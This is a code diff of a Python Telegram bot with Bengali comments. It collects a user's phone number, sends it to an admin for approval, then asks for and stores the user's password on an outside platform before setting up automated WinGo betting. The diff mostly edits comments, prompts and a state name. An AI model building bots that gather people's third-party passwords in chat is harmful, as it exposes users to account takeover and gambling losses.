@@ -58,7 +58,6 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     state = get_state(uid)
     
-    # যদি ইউজার ইতিমধ্যে লগইন এবং পাসওয়ার্ড দিয়ে সম্পূর্ণ রেডি থাকে
     if state["logged_in"] and state.get("game"):
         keyboard = [
             [
@@ -108,7 +107,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     state = get_state(uid)
     text = update.message.text.strip()
 
-    # ১. ইউজার যখন ফোন নম্বর দেবে
+    # ধাপ ১: ইউজার ফোন নম্বর দেবে
     if not state["logged_in"] and state.get("awaiting") == "phone":
         state["phone"] = text
         state["awaiting"] = "pending_approval"
@@ -117,7 +116,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "⏳ আপনার নম্বরটি অ্যাডমিনের কাছে অনুমোদনের জন্য পাঠানো হয়েছে। দয়া করে অপেক্ষা করুন..."
         )
 
-        # অ্যাডমিনকে নোটিফিকেশন এবং অ্যাপ্রুভ করার বাটন পাঠানো
         admin_text = (
             "🔔 **NEW LOGIN REQUEST!**\n\n"
             f"👤 Name: {name}\n"
@@ -140,18 +138,17 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             print(f"Admin message error: {e}")
         return
 
-    # ২. অ্যাডমিন পারমিশন দেওয়ার পর ইউজার যখন পাসওয়ার্ড দেবে
-    if not state["logged_in"] and state.get("awaiting") == "password":
+    # ধাপ ২: অ্যাডমিন অ্যাপ্রুভ করার পর ইউজার পাসওয়ার্ড দেবে
+    if not state["logged_in"] and state.get("awaiting") == "waiting_password":
         state["password"] = text
         state["logged_in"] = True
         state["awaiting"] = None
 
         await update.message.reply_text(
-            "✅ *পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!*",
+            "✅ *পাসওয়ার্ড সফলভাবে গৃহিত হয়েছে এবং একাউন্ট যুক্ত হয়েছে!*\n🎯 গেম সিলেক্ট করুন:",
             parse_mode="Markdown"
         )
 
-        # পাসওয়ার্ড পাওয়ার পর গেম সিলেকশন বাটন পাঠানো
         keyboard = [
             [
                 InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
@@ -163,13 +160,12 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ],
         ]
         await update.message.reply_text(
-            "🎯 গেম সিলেক্ট করুন:",
-            parse_mode="Markdown",
+            "👇 নিচ থেকে গেম মোড বেছে নিন:",
             reply_markup=InlineKeyboardMarkup(keyboard),
         )
         return
 
-    # ৩. গেমের স্টেপস সেট করা
+    # ধাপ ৩: গেমের স্টেপস (বেট অ্যামাউন্ট) সেট করা
     if state["logged_in"]:
         if state.get("awaiting") == "steps":
             try:
@@ -187,7 +183,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 )
             return
 
-        # ৪. টার্গেট প্রফিট সেট করা
+        # ধাপ ৪: টার্গেট প্রফিট সেট করা এবং অটো-বেট শুরু হওয়া
         if state.get("awaiting") == "target":
             try:
                 tgt = float(text)
@@ -230,19 +226,17 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     elif data.startswith("approve_"):
         target_uid = int(data.split("_")[1])
         target_state = get_state(target_uid)
-        target_state["awaiting"] = "password"  # অ্যাপ্রুভ করার পর পাসওয়ার্ড চাইতে বলবে
+        target_state["awaiting"] = "waiting_password"  # অ্যাপ্রুভ করার পর পাসওয়ার্ড চাওয়ার জন্য সেট করা হলো
 
-        # অ্যাডমিন চ্যাট আপডেট করা
         try:
             await query.edit_message_text(f"{query.message.text}\n\n✅ **APPROVED!**")
         except:
             pass
 
-        # নির্দিষ্ট ইউজারকে পাসওয়ার্ড চাওয়ার মেসেজ পাঠানো
         try:
             await ctx.bot.send_message(
                 chat_id=target_uid,
-                text="✅ *ADMIN APPROVED YOUR ACCOUNT!*\n\n🔑 এখন আপনার একাউন্টের পাসওয়ার্ড দিন:",
+                text="✅ *ADMIN APPROVED YOUR ACCOUNT!*\n\n🔑 এখন আপনার প্ল্যাটফর্মের পাসওয়ার্ডটি দিন:",
                 parse_mode="Markdown",
             )
         except Exception as e:
